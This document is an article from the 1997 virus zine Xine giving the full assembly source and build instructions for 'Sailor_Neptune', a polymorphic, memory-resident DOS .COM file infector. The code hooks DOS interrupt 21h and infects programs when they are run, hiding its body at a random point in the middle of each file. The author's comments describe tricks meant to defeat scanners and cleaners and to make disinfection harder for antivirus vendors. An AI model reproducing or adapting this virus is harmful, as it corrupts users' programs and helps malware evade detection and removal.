   ;                                        /-----------------------------\
   ;                                        | Xine - issue #2 - Phile 028 |
   ;                                        \-----------------------------/


   ;
   ; Virus Name    : Sailor_Neptune
   ; Virus Author  : b0z0
   ; Origin        : Padania, March/April 1997
   ; Compiling     : Use TASM 3.0
   ;                       tasm /m5 neptune.asm
   ;                       tlink /t neptune
   ; Tech Desc     : Sailor_Neptune is a quite simple TSR COM infector,
   ;                 that will place itself not at the end of the file but
   ;                 in a random position in the middle of the file.
   ;                 It is just a little bit polymorphic. The sequence of
   ;                 the operations in the decryptor is always the same,
   ;                 but registers and operations are changed. The key
   ;                 of the operation (add,sub,xor) is changed with another
   ;                 math operation. This little polymorphism isn't aimed
   ;                 to make the virus unscannable (since it is very simple
   ;                 and scannable :) ), but is rather done to make the
   ;                 disinfection procedure harder. Of course the piece of
   ;                 the file that has been overwritten by the virus is saved
   ;                 at the end of the file. Of course it is encrypted.
   ;                 There are some AV-tricks in the virus (TBClean for
   ;                 example will just cut the .COM at the virus position
   ;                 and leaving a JMP AX as the first opcodes in the
   ;                 'cleaned' file ;) ) to make scanning and removing
   ;                 even harder. To fool TBScan (always) and AVP
   ;                 (just sometimes, quite never) the COMs will have the entry
   ;                 point simillar to a PKlited file. So a 'packed program'
   ;                 warning may appear :)
   ;                 Of course this 'midplacing' method makes also CRC to
   ;                 miserably fail.
   ;                 Since the virus is placed somewhere in the middle of
   ;                 the file it isn't possible to do the simple lenght
   ;                 addition (as Yosha suggest) to the CRC after the
   ;                 coms that have the enuns selfcheck, because it
   ;                 may be just where the virus has been placed. So
   ;                 instead of risking this the virus will simply skip
   ;                 those coms.
   ;                 There isn't too much to say about this virus. Since
   ;                 it infects just COMs i don't think it will have good
   ;                 possibilityes to spread around. On the other side i
   ;                 think (well, i hope) that removing this virus isn't
   ;                 really simple, so AV-ers will have to work a little :)
   ;                 Well, that's all for now ;)
   ;                 I had some more projects for this virus (to make it
   ;                 a lot better) but due to time restrictions this virus
   ;                 hasn't been finished as i have initially hoped.
   ;                 But that's life ;))
   ;

   neptune         segment
                   assume cs:neptune, ds:neptune; es:neptune

                   org     100h

   start:
                   mov     di,offset enc_start     ; mov reg_pointer,offset
   counter:
                   mov     cx,(virus_nopoly/2)     ; mov reg_counter,size
   operator:
                   mov     dx,00h                  ; mov reg_operand,init_value
   decrypt_loop:
                   xor     word ptr ds:[di],dx     ; oper [reg_pointer],reg_oper
   modifyer:
                   add     dx,00h                  ; oper reg_oper,oper_value
   inc_memory:
                   inc     di                      ; inc reg_pointer
                   inc     di                      ; inc reg_pointer
   decrement:
                   dec     cx                      ; dec reg_counter
                   jnz     decrypt_loop
   enc_start:
                   pop     bp                      ; just to be precise correct
                                                   ; the stack from the 'PK' :)
                   call    delta                           ; delta offset
   delta:
                   pop     bp
                   sub     bp,offset delta

                   mov     ax,3026h                        ; install check
                   int     21h
                   cmp     ax,2630h
                   jne     not_installed
                   jmp     restore_com
   not_installed:

                   mov     ax,es                           ; psp
                   dec     ax
                   mov     ds,ax                           ; mcb

                   xor     di,di

   check_mcb:
                   cmp     byte ptr ds:[di],'Z'            ; last?
                   je      last_block
                   add     ax,word ptr ds:[di+03h]
                   inc     ax
                   mov     ds,ax                           ; on next
                   jmp     check_mcb
   last_block:
                   sub     word ptr ds:[di+03h],para_virus
                   sub     word ptr ds:[di+12h],para_virus
                   mov     byte ptr ds:[di],'M'

                   add     ax,word ptr ds:[di+03h]
                   inc     ax                      ; virus mcb segment

                   mov     ds,ax

                   mov     word ptr ds:[di+03h],para_virus-1
                   mov     word ptr ds:[di+01h],08h
                   mov     byte ptr ds:[di],'Z'

                   inc     ax                      ; virus segment

                   push    cs
                   pop     ds

                   sub     ax,0fh                  ; so CS:IP will be correct
                                                   ; considering that the adresses
                                                   ; are calculated from start
                                                   ; as CS:100h
                   mov     cx,virus_words
                   mov     es,ax
                   mov     di,100h
                   lea     si,[bp+start]           ; copy virus
                   rep     movsw

                   xor     dx,dx
                   mov     ds,dx

                   mov     cx,offset virus_int21

                   cli
                   xchg    cx,word ptr ds:[084h]           ; install int21h
                   xchg    ax,word ptr ds:[086h]
                   mov     word ptr es:[old_21_off],cx
                   mov     word ptr es:[old_21_seg],ax
                   sti

                   push    cs
                   pop     ds

                   push    cs
                   pop     es

   restore_com:
                   mov     di,100h
                   mov     word ptr ds:[di],0e0ffh         ; jmp ax
                   mov     ax,bp
                   add     ax,offset return_antitbclean    ; calculate return jmp
                   jmp     di                              ; just to fuck tbclean
                                                           ; or simillar progs

   return_antitbclean:
                   push    di
                   lea     si,[offset first_old + bp] ; restore first 5 bytes
                   movsw
                   movsb
                   movsw
                   pop     bx

                   mov     si,word ptr ds:[orig_pos+bp]    ; original bytes pos
                   add     si,bx

                   mov     di,si
                   add     di,(virus_size-1)
                   mov     al,byte ptr ds:[dec_value+bp]   ; position dec value
                   mov     byte ptr ds:[di+1],al

                   std
                   call    enc_dec_orig                    ; decrypt original
                   cld

                   mov     di,word ptr ds:[virus_pos+bp]   ; virus position
                   add     di,bx
                   mov     cx,virus_size

                   sub     bx,02h                  ; jump to cs:0FEh
                   mov     word ptr ds:[bx],0a4f3h ; REP MOVSB

                   push    bx

                   xor     bx,bx
                   xor     ax,ax
                   xor     dx,dx
                   xor     bp,bp

                   ret                             ; go there!

   first_old       db      0cdh,020h,00h,00h,00h
   virus_pos       dw      (virus_end_mem)         ; where the virus resides
   orig_pos        dw      (virus_end_mem)         ; where the original body
                                                   ; is placed (= filelenght)

   virus_int21:
                   cmp     ax,3026h                ; residency check
                   jne     no_rescheck
                   xchg    ah,al
                   iret
   no_rescheck:
                   xor     ax,4b00h                ; execute
                   jz      execute

   chain_old_21:
                   xor     ax,4b00h
                   db      0eah
   old_21_off      dw      00h
   old_21_seg      dw      00h

   virus_name      db      'Sailor_Neptune',0

   execute:
                   pushf
                   push    ds
                   push    es

                   push    ax
                   push    cx
                   push    dx
                   push    bx
                   push    di
                   push    si
                   push    bp

                   push    ds
                   push    dx

                   push    cs
                   pop     ds
                   mov     ax,3524h                ; save int 24h handler
                   int     21h
                   mov     word ptr ds:[old_24off],bx
                   mov     word ptr ds:[old_24seg],es

                   mov     dx,offset int_24handler
                   mov     ax,2524h
                   int     21h                     ; set our int 24h

                   pop     dx
                   pop     ds

                   mov     di,dx

                   mov     ax,4300h                ; get attributes
                   int     21h

                   push    cx                      ; push attribs
                   push    dx                      ; push filename seg:off
                   push    ds

                   xor     cx,cx                   ; delete attributes
                   call    attrib_set
                   jnc     ok_writing

                   add     sp,06h                  ; adjust stack and exit
   first_exit:
                   jmp     error_opening           ; if error occoured

   ok_writing:
                   mov     ax,3D02h                ; open for RW
                   int     21h
                   jnc     ok_open
                   jmp     error_opening_att
   ok_open:
                   push    ax
                   pop     bx                      ; BX handle

                   push    cs
                   pop     ds

                   mov     ax,5700h                ; store date and time
                   int     21h
                   mov     word ptr ds:[filedate],dx
                   mov     word ptr ds:[filetime],cx

                   mov     ah,3fh                  ; read from file
                   mov     cx,05h
                   mov     dx,offset first_old
                   int     21h

                   cmp     byte ptr ds:[first_old],'M'    ; MZ ?
                   je      exit_buffer_err
                   cmp     byte ptr ds:[first_old],'Z'    ; ZM ?
                   je      exit_buffer_err
                   cmp     word ptr ds:[first_old],'KP'    ; Pklited? :))
                   jne     ok_buffer
                   cmp     byte ptr ds:[first_old+2],0e9h  ; jump after PK?
                   jne     ok_buffer
   exit_buffer_err:
                   jmp     exit_nofile

   ok_buffer:
                   stc
                   call    go_body_pos             ; seek to end

                   mov     word ptr ds:[orig_pos],ax

   ; check file lenght

                   cmp     ax,(0fadeh - virus_size - 32) ; enough space?
                   jae     bad_lenght

                   cmp     ax,2000d                ; not too short
                   ja      ok_file
   bad_lenght:
                   jmp     exit_nofile
   ok_file:

                   mov     cx,ax                   ; cx=file lenght
                   sub     cx,(virus_size)

   random_place:
                   in      ax,40h                  ; get random
                   mov     dx,ax
                   in      ax,40h
                   xor     ax,dx

                   cmp     ax,cx                   ; from 05 to Fsize-vsize
                   jae     random_place

                   cmp     ax,05h
                   jbe     random_place

                   push    ax

                   mov     word ptr ds:[virus_pos],ax

                   call    go_body_pos             ; go to random position in file

                   mov     ah,3fh                  ; read what will be overwritten
                   mov     dx,offset file_buffer
                   mov     cx,virus_size
                   int     21h

                   mov     ax,word ptr ds:[orig_pos]
                   sub     ax,04h
                   call    go_body_pos             ; go to the end-5

                   mov     ah,3fh                  ; read last 5 bytes
                   mov     dx,offset last_four
                   mov     cx,04h
                   int     21h

                   pop     ax
                   cmp     word ptr ds:[last_four],'SN'    ; special coms?
                   je      exit_nofile
                   push    ax

                   cld
                   mov     di,offset file_buffer
                   in      al,40h
                   mov     byte ptr ds:[dec_value],al
                   mov     byte ptr ds:[virus_end_mem-1],al
                   push    cs
                   pop     es
                   call    enc_dec_orig            ; encrypt original bytes

                   mov     dx,offset file_buffer
                   mov     cx,virus_size
                   call    write_oper              ; write original bytes

                   in      al,40h
                   xor     ah,ah
                   add     dx,ax                   ; add random offset
                   and     al,011111b              ; write some rnd bytes
                   mov     cx,ax
   write_check:
                   call    write_oper

                   pop     ax
                   push    ax

                   call    go_body_pos             ; go to the sel. rnd pos

                   call    encrypt_it

                   mov     dx,100h
                   mov     cx,(offset enc_start - offset start)
                   call    write_oper

                   mov     dx,offset enc_start
                   mov     cx,virus_nopoly
                   call    encryptor
                   call    write_oper              ; write virus body in file

                   xor     ax,ax
                   call    go_body_pos             ; go to start

                   pop     ax                      ; ax = pos of virus body

                   sub     ax,05h                  ; - jump - 'PK'

                   mov     di,offset file_buffer
                   mov     word ptr ds:[di],'KP'
                   mov     byte ptr ds:[di+2],0e9h ; code the jump
                   mov     word ptr ds:[di+3],ax

                   mov     dx,di
                   mov     cx,05h
                   call    write_oper              ; write the jump

                   mov     dx,word ptr ds:[filedate]
                   mov     cx,word ptr ds:[filetime]
                   mov     ax,5701h                ; restore date and time
                   int     21h

   exit_nofile:
                   mov     ah,3eh                  ; close file
                   int     21h

   error_opening_att:
                   pop     ds
                   pop     dx
                   pop     cx
                   call    attrib_set

   error_opening:
                   mov     dx,word ptr ds:[old_24off]
                   mov     ds,word ptr cs:[old_24seg]
                   mov     ax,2524h
                   int     21h                     ; old int 24h handler

                   pop     bp
                   pop     si
                   pop     di
                   pop     bx
                   pop     dx
                   pop     cx
                   pop     ax

                   pop     es
                   pop     ds
                   popf

                   jmp     chain_old_21

   author          db      '-b0z0/iKx-'

   ; As for encryption of the original piece of code of the COM...
   ; Instead of using a more classic xor for each byte with a fixed value,
   ; the routine is somehow recursive. Infact when we are encrypting the
   ; key of the first byte is the second byte, the key for the second byte
   ; is the third byte and so on till the end, where the key for the last
   ; byte is the random value. So for the decryption the algorithm will
   ; be inverse, starting from the end and using the random value it will
   ; decrypt from the end to the start 'generating' in the same time the
   ; needed decryption keys...
   ; Maybe AVrs will have to spend some more bytes to restore this data
   ; comparing the restoration of the other too classic method ;))

   enc_dec_orig:
                   mov     cx,(virus_size)
   data_encrypt:
                   mov     al,byte ptr ds:[di]     ; will be enc
                   mov     dl,byte ptr ds:[di+1]   ; key
                   xor     al,dl
                   stosb
                   loop    data_encrypt
                   ret

   dec_value       db      00h

   encrypt_it:
                   call    do_register
                   cmp     al,03h          ; is BX
                   je      ok_pointer
                   cmp     al,05h          ; only SI or DI
                   jbe     encrypt_it
   ok_pointer:
                   mov     cl,al
                   push    ax
                   add     al,040h         ; inc
                   mov     ah,al
                   mov     word ptr ds:[inc_memory],ax
                   pop     ax
                   add     al,0b8h
                   mov     byte ptr ds:[start],al          ; mov pointer
                   mov     ax,word ptr ds:[virus_pos]
                   add     ax,offset enc_start
                   mov     word ptr ds:[start+1],ax        ; pointer value
                   mov     al,04h
                   cmp     cl,06h
                   je      no_change
                   inc     al                              ; decryptor byte
                   cmp     cl,07h                          ; pointer dependant
                   je      no_change
                   inc     al
                   inc     al
   no_change:
                   push    ax
   change_register:

                   call    do_register
                   cmp     al,cl
                   je      change_register
                   mov     ch,al
                   push    ax
                   mov     dl,0c0h                         ; add base
   mody_oper:
                   call    do_register
                   cmp     al,02h
                   ja      mody_oper
                   or      al,al
                   jz      ok_store
                   add     dl,28h                          ; +28h = sub
                   cmp     al,01h
                   je      ok_store
                   add     dl,08h                          ; +8h = xor
   ok_store:
                   push    dx
                   add     dl,ch
                   mov     byte ptr ds:[modifyer+1],dl     ; change operand
                   pop     dx                              ; and operation
                   inc     dl
                   inc     dl
                   mov     byte ptr ds:[opera+1],dl        ; for encryption
                   in      al,40h
                   mov     byte ptr ds:[modifyer+2],al
                   mov     byte ptr ds:[opera+2],al
                   pop     ax
                   add     al,0b8h
                   mov     byte ptr ds:[operator],al       ; mov operand,
                   in      ax,40h
                   mov     word ptr ds:[operator+1],ax
                   mov     word ptr ds:[encryption+1],ax
   change_counter:
                   call    do_register
                   cmp     al,cl
                   je      change_counter
                   cmp     al,ch
                   je      change_counter
                   push    ax
                   add     al,048h
                   mov     byte ptr ds:[decrement],al      ; dec counter
                   pop     ax
                   add     al,0b8h
                   mov     byte ptr ds:[counter],al        ; mov counter,size
                   pop     ax
   dec_crea:
                   cmp     ch,00h
                   je      finished_change
                   add     al,08h
                   dec     ch
                   jmp     dec_crea
   finished_change:
                   mov     byte ptr ds:[decrypt_loop+1],al ; oper [mem],operand

   ; main operation
   main_oper:
                   call    do_register
                   cmp     al,02h          ; xor, sub or add
                   ja      main_oper
                   mov     cl,al           ; al = 01h = add
                   mov     al,01h
                   cmp     cl,00h
                   je      ok_do_add
                   add     al,28h          ; al = 29h = sub
                   cmp     cl,01h
                   je      ok_do_add
                   add     al,08h          ; al = 31h = xor

   ok_do_add:
                   mov     byte ptr ds:[decrypt_loop],al   ; store main oper
                   mov     al,31h          ; generate the adeguate encryption
                   cmp     cl,02h
                   je      ok_reverse      ; for xor use xor
                   sub     al,08h
                   cmp     cl,00h          ; for add use sub
                   je      ok_reverse
                   sub     al,028h         ; for sub use add ;)
   ok_reverse:
                   mov     byte ptr ds:[enc_loop],al
                   ret

   do_register:
                   in      al,40h
                   and     al,0111b
                   cmp     al,04h
                   je      do_register     ; no SP
                   ret

   encryptor:
                   ; dx = offset
                   ; cx = bytes size
                   push    cs
                   pop     es

                   push    cx
                   mov     di,offset file_buffer
                   push    di
                   mov     si,dx           ; source
                   push    di
                   shr     cx,1            ; to words
                   push    cx
                   rep     movsw           ; copy body
                   pop     cx
                   pop     si
   encryption:
                   mov     dx,0000h        ; will be changed by poly
   enc_loop:
                   xor     word ptr ds:[si],dx
   opera:
                   add     dx,00h          ; change operator
                   inc     si              ; next word
                   inc     si
                   loop    enc_loop
                   pop     dx
                   pop     cx
                   ret

   write_oper:
                   mov     ah,40h          ; write to file
                   int     21h
                   ret

   go_body_pos:                            ; if C  set then seek to end
                   mov     dx,ax           ; if NC go to 0:DX from start
                   mov     ax,4200h
                   jnc     no_seek_end
                   inc     al
                   inc     al
                   cwd
   no_seek_end:
                   xor     cx,cx
                   int     21h
                   ret

   attrib_set:
                   mov     ax,4301h        ; set attributes
                   int     21h
                   ret

   int_24handler:
                   xor     al,al
                   iret

   virus_end:

   ; EQUs ---
   para_virus      = (offset virus_end_mem - offset start + 0fh)/10h + 2
   virus_words     = (offset virus_end_mem - offset start + 1)/2
   virus_size      = (offset virus_end - offset start + 1)
   virus_nopoly    = (offset virus_end - offset enc_start +  1)
   ;

   old_24off       dw      00h             ; int 24h offset
   old_24seg       dw      00h             ; int 24h segment

   filedate        dw      00h             ; file date
   filetime        dw      00h             ; file time

   last_four       db      04h             dup     (?)     ; last five bytes

   file_buffer     db      (virus_size+1)  dup     (?)
   virus_end_mem:

   neptune         ends
                   end             start
